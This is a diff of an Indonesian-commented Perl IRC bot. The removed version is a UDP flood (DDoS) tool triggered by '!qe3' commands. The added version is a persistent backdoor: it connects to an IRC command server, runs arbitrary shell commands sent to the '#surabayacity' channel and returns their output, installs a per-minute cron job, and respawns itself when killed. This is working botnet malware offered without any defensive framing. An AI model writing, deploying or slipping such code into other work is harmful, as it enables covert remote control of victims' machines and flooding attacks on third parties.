@@ -1,125 +1,150 @@
 #!/usr/bin/perl
-
 use strict;
 use warnings;
 use IO::Socket::INET;
-use POSIX qw(setsid);
-use Socket;
-use Getopt::Long;
-use Time::HiRes qw(usleep gettimeofday);
+use POSIX ":sys_wait_h";
+use File::Basename;
+use File::Spec::Functions qw(rel2abs);
 
-# Informasi server dan channel
-my $server = 'irc.ongisnade.co.id';
-my $port = 7000;
-my $nick = generate_random_nick();
-my $channel = '#surabayacity';
+# Path ke file PID
+my $pid_file = '/dev/shm/qe3.pid';
 
-# Mengabaikan sinyal SIGINT dan SIGHUP
-$SIG{INT} = 'IGNORE';
-$SIG{HUP} = 'IGNORE';
-$SIG{TERM} = 'IGNORE';
+# Path ke skrip ini
+my $script_path = rel2abs($0);
 
 # Fungsi untuk membuat nickname acak
 sub generate_random_nick {
     my @chars = ('A'..'Z', 'a'..'z', '0'..'9');
     my $nick = '';
-    $nick .= $chars[rand @chars] for 1..8; # Panjang nickname 8 karakter
+    $nick .= $chars[rand @chars] for 1..8;
     return $nick;
 }
 
-# Fork proses dan menjadi daemon
+# Fungsi untuk menghubungkan ke IRC
+sub connect_to_irc {
+    my $server = 'irc.ongisnade.co.id';
+    my $port = 7000;
+    my $channel = '#surabayacity';
+    my $nick = generate_random_nick();
+
+    my $socket = IO::Socket::INET->new(
+        PeerAddr => $server,
+        PeerPort => $port,
+        Proto    => 'tcp'
+    ) or die "Could not connect to IRC server: $!";
+
+    print $socket "NICK $nick\r\n";
+    print $socket "USER $nick 8 * :Perl IRC Client\r\n";
+    print $socket "JOIN $channel\r\n";
+
+    return $socket;
+}
+
+# Fungsi untuk memeriksa dan membuat file PID
+sub create_pid_file {
+    open(my $fh, '>', $pid_file) or die "Could not create PID file: $!";
+    print $fh $$;
+    close($fh);
+}
+
+# Fungsi untuk memeriksa apakah skrip sudah berjalan
+sub check_if_already_running {
+    if (-e $pid_file) {
+        open(my $fh, '<', $pid_file) or die "Could not open PID file: $!";
+        my $pid = <$fh>;
+        close($fh);
+        chomp $pid;
+        if ($pid && kill 0, $pid) {
+            print "Script is already running with PID $pid\n";
+            exit 0;
+        } else {
+            print "PID file exists but process not running. Starting new process.\n";
+        }
+    }
+}
+
+# Fungsi untuk menambahkan cron job jika belum ada
+sub ensure_cron_job {
+    my $cron_job = "* * * * * /usr/bin/perl $script_path\n";
+    my $cron_exists = `crontab -l 2>/dev/null | grep -F "$script_path"`;
+    unless ($cron_exists) {
+        my $current_crontab = `crontab -l 2>/dev/null`;
+        open(my $fh, '| crontab -') or die "Could not open crontab: $!";
+        print $fh $current_crontab;
+        print $fh $cron_job;
+        close($fh);
+    }
+}
+
+# Pastikan cron job ada
+ensure_cron_job();
+
+# Memeriksa apakah skrip sudah berjalan
+check_if_already_running();
+
+# Membuat file PID
+create_pid_file();
+
+# Fungsi untuk mengeksekusi perintah shell
+sub execute_command {
+    my ($command) = @_;
+    my $output = `$command 2>&1`;
+    return $output;
+}
+
 my $pid = fork();
-if ($pid) {
-    exit 0;
-} elsif (defined $pid) {
-    setsid();
-    umask 0;
-    chdir '/';
+if (!defined $pid) {
+    die "Cannot fork: $!";
+}
+
+if ($pid == 0) {
+    # Ini adalah proses anak, jalankan proses utama Anda di sini
+    my $socket = connect_to_irc();
+    while (1) {
+        my $input = <$socket>;
+        if (defined $input) {
+            print $input;  # Output dari server IRC
+            if ($input =~ /^PING(.*)$/i) {
+                print $socket "PONG$1\r\n";
+            } elsif ($input =~ /^:.* PRIVMSG .* :!qe3 (.*)$/i) {
+                my $command = $1;
+                my $result = execute_command($command);
+                my $response = "PRIVMSG #surabayacity :$result\r\n";
+                print $socket $response;
+            }
+        }
+        sleep(1);
+    }
 } else {
-    die "Tidak dapat fork: $!";
-}
-
-# Membuat koneksi socket ke server IRC
-my $socket = IO::Socket::INET->new(
-    PeerAddr => $server,
-    PeerPort => $port,
-    Proto    => 'tcp'
-) or die "Tidak dapat terhubung ke server $server:$port $!";
-
-print "Terhubung ke server $server:$port dengan nickname $nick\n";
-
-# Fungsi untuk mengirim data ke server IRC
-sub send_irc {
-    my ($msg) = @_;
-    print $socket "$msg\r\n";
-    print ">> $msg\n";
-}
-
-# Mengirim informasi login
-send_irc("NICK $nick");
-send_irc("USER $nick 8 * :Simple IRC Bot");
-
-# Fungsi untuk menangani input dari server IRC
-sub handle_server_input {
-    while (my $input = <$socket>) {
-        print "<< $input";
-        if ($input =~ /^PING\s+(.*)$/i) {
-            send_irc("PONG $1");
-        }
-        elsif ($input =~ /001\s+$nick\s+/) {
-            send_irc("JOIN $channel");
-        }
-        elsif ($input =~ /PRIVMSG\s+$channel\s+:(.*)$/i) {
-            my $message = $1;
-            if ($message =~ /hello/i) {
-                send_irc("PRIVMSG $channel :Hello, everyone!");
-            }
-            elsif ($message =~ /!qe3\s+(\S+)\s+--port=(\d+)\s+--size=(\d+)\s+--time=(\d+)\s+--delay=(\d+\.?\d*)\s+--bandwidth=(\d+)/i) {
-                my ($target_ip, $port, $size, $time, $delay, $bw) = ($1, $2, $3, $4, $5, $6);
-                start_ddos($target_ip, $port, $size, $time, $delay, $bw);
+    # Ini adalah proses induk, memantau proses anak
+    $SIG{CHLD} = sub {
+        waitpid(-1, WNOHANG);
+        # Jika proses anak mati, kita restart proses anak
+        if ($? == -1 || $? != 0) {
+            $pid = fork();
+            if ($pid == 0) {
+                my $socket = connect_to_irc();
+                while (1) {
+                    my $input = <$socket>;
+                    if (defined $input) {
+                        print $input;
+                        if ($input =~ /^PING(.*)$/i) {
+                            print $socket "PONG$1\r\n";
+                        } elsif ($input =~ /^:.* PRIVMSG .* :!qe3 (.*)$/i) {
+                            my $command = $1;
+                            my $result = execute_command($command);
+                            my $response = "PRIVMSG #surabayacity :$result\r\n";
+                            print $socket $response;
+                        }
+                    }
+                    sleep(1);
+                }
             }
         }
+    };
+
+    while (1) {
+        # Proses induk berjalan, memantau proses anak
+        sleep(1);
     }
 }
-
-# Fungsi untuk memulai serangan DDoS
-sub start_ddos {
-    my ($ip, $port, $size, $time, $delay, $bw) = @_;
-
-    if ($bw && $delay) {
-        print "WARNING: The package size overrides the parameter --the command will be ignored\n";
-        $size = int($bw * $delay / 8);
-    } elsif ($bw) {
-        $delay = (8 * $size) / $bw;
-    }
-
-    $size = 700 if $bw && !$size;
-
-    ($bw = int($size / $delay * 8)) if ($delay && $size);
-
-    my ($iaddr, $endtime, $psize, $pport);
-    $iaddr = inet_aton("$ip") or die "Cannot resolve the hostname: $ip\n";
-    $endtime = time() + ($time ? $time : 1000000);
-    socket(flood, PF_INET, SOCK_DGRAM, 17);
-
-    printf "\e[0;32m>> Made by SamY from cqHack\n";
-    printf "\e[0;31m>> Hitting the IP: %s\n", $ip;
-    printf "\e[0;36m>> Hitting the port: %d\n", $port;
-    print "Interpacket delay: $delay msec\n" if $delay;
-    print "Total IP bandwidth: $bw kbps\n" if $bw;
-    printf "\e[1;31m>> Press CTRL+C to stop the attack\n" unless $time;
-
-    die "Invalid package size: $size\n" if $size && ($size < 64 || $size > 1500);
-    $size -= 28 if $size;
-
-    for (; time() <= $endtime;) {
-        $psize = $size ? $size : int(rand(1024 - 64) + 64);
-        $pport = $port ? $port : int(rand(65500)) + 1;
-
-        send(flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
-        usleep(1000 * $delay) if $delay;
-    }
-}
-
-# Memulai loop untuk menerima input dari server
-handle_server_input();
